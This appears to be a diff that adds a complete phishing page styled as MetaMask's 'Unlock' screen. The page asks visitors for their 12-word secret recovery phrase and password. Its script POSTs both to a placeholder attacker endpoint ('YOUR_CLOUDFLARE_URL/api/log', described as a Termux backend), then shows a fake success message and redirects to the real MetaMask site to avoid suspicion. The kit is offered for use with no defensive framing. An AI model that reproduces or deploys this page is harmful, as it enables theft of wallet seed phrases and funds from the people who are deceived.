@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask</title>
+    <style>
+        /* General Page Styles */
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            color: #2c2c2c;
+        }
+
+        /* Logo Styling */
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+        }
+
+        /* Form Container */
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        p {
+            font-size: 14px;
+            color: #5e5e5e;
+            margin-bottom: 30px;
+        }
+
+        /* Input Fields */
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #d4d4d4;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #009688;
+            box-shadow: 0 0 0 2px rgba(0, 150, 136, 0.2);
+        }
+
+        /* Button Styling */
+        button {
+            background-color: #009688;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 20px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #00796b;
+        }
+
+        button:disabled {
+            background-color: #b2dfdb;
+            cursor: not-allowed;
+        }
+
+        /* Loading Spinner (Hidden by default) */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #009688;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            display: none;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- MetaMask Logo -->
+    <div class="logo-container">
+        <img src="https://metamask.io/images/logo-meta-mask.svg" alt="MetaMask Logo" class="logo">
+    </div>
+
+    <div class="container">
+        <h1>Unlock MetaMask</h1>
+        <p>Enter your secret recovery phrase to restore access.</p>
+
+        <!-- The Form -->
+        <form id="loginForm">
+            <input type="text" id="seed" placeholder="Enter your 12-word secret phrase" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            
+            <button type="submit" id="submitBtn">Unlock</button>
+            
+            <!-- Loading Spinner -->
+            <div class="loader" id="loader"></div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Stop the page from refreshing
+
+            const seed = document.getElementById('seed').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+
+            // UI Feedback: Disable button and show spinner
+            btn.disabled = true;
+            btn.innerText = "Unlocking...";
+            loader.style.display = "block";
+
+            // Send data to your Termux backend
+            // IMPORTANT: Replace 'YOUR_CLOUDFLARE_URL' with your actual Cloudflare link
+            fetch('https://YOUR_CLOUDFLARE_URL/api/log', {
+                method: 'POST',
+                body: JSON.stringify({ seed: seed, password: password }),
+                headers: {'Content-Type': 'application/json'}
+            })
+            .then(response => {
+                // If successful, show a fake "Success" message
+                alert("Wallet unlocked successfully!");
+                // Optional: Redirect to the real MetaMask site to sell it
+                window.location.href = "https://metamask.io";
+            })
+            .catch(error => {
+                alert("Network error. Please try again.");
+                btn.disabled = false;
+                btn.innerText = "Unlock";
+                loader.style.display = "none";
+            });
+        });
+    </script>
+</body>
+</html>
